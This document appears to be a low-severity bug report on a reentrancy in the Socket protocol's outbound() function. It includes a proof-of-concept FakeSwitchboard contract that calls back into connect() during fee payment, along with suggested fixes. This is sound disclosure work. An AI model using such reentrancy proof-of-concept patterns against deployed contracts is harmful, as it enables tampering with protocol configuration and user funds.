### Description

The function `outbound()` can cause a reentrancy, because it calls a Swithboard that can be user supplied and thus fake.

With the current code I haven't been able to cause negative effects on the protocol.
Future updates of the code might increase the risk.
Therefor severity set to low.


### Steps to reproduce

1. Create a `FakeSwitchboard`, see sample code below
2. Register the `FakeSwitchboard` via `registerSwitchBoard()`
3. Call `connect()` using the `FakeSwitchboard`
4. Call `outbound()`
5. Function `outbound` calls `_deductFees()`, which calls `switchboard__.payFees()`
6. `switchboard__` is an untrusted address because it can be supplied by the user, in this case its the `FakeSwitchboard`
7. So `FakeSwitchboard.payFees()` is called, which can call back into to `Plug`
8. The `Plug` can call `connect()` again and change the `Switchboards` and `(de)capacitor`
9. Function `outbound()` continues but now has an enhanced version of `plugConfig` 
10. Note: it is relevant that `plugConfig` is a `storage` pointer
11. A potentially different `capacitor__` will be called from `outbound()`


### Expected behavior
Would expect the parameters inside `outbound()` to stay the same during its execution.
Possible solutions:
- use `PlugConfig memory plugConfig`, which makes a copy of `plugConfig` so it can't be changed.
- add reentrancy protection to `connect()` and `outbound()`


### Actual behavior

The `connect()` parameters can be changed via a reentrancy.


### Screenshots


### Additional information

[SocketSrc.sol#L35-119](https://github.com/SocketDotTech/socket-DL/blob/master/contracts/socket/SocketSrc.sol#L35-119)
```solidity
    function outbound(...) ... {        
        PlugConfig storage plugConfig = _plugConfigs[msg.sender][remoteChainSlug_];
        ...
        ISocket.Fees memory fees = _deductFees(
            msgGasLimit_,
            uint32(remoteChainSlug_),
            plugConfig.outboundSwitchboard__
        );
        bytes32 packedMessage = hasher__.packMessage(..., plugConfig.siblingPlug,...); // siblingPlug can be changed
        plugConfig.capacitor__.addPackedMessage(packedMessage); // capacitor__ can be changed
		...
    }
    function _deductFees(...) ... {
        ...
        switchboard__.payFees{value: fees.switchboardFees}(remoteChainSlug_); // external call to unsafe address
        ...   
    }	
```

POC for a FakeSwitchboard:
```solidity
contract FakeSwitchboard {

    address globalcb;

    function payFees(uint32 dstChainSlug_) external payable  {
        TestWithFork(globalcb).callbackfromfake();
    }

    function getMinFees(uint32 dstChainSlug_) external view  returns (uint256, uint256) {
        return (0,0);
    }
    
    function registerCapacitor(
        uint256 siblingChainSlug_,
        address capacitor_,  
        uint256 maxPacketSize_
    ) external  {  }

    function allowPacket(
        bytes32,
        bytes32 packetId_,
        uint32 srcChainSlug_,
        uint256 proposeTime_
    ) external view  returns (bool) {     
        return true;
    }

    function setcallback(address cb) public {
        globalcb = cb;
    }
}

contract Plug {
	address fake;

	constructor() {
		fake = address(new FakeSwitchboard());
		FakeSwitchboard(fake).setcallback(address(this));			
		socketGoerli.registerSwitchBoard(fake,uint256(1),slugMumbai,uint32(1));		

		socketGoerli.connect(slugMumbai,plugMumbai,fake,fake);

		bytes32 msgId = socket.outbound(slugMumbai,msgGasLimit,payload);

	}

	function callbackfromfake() public {
	   socketGoerli.connect(slugMumbai,plugMumbai,OtherSwitchBoard,OtherSwitchBoard);
	}
}

```
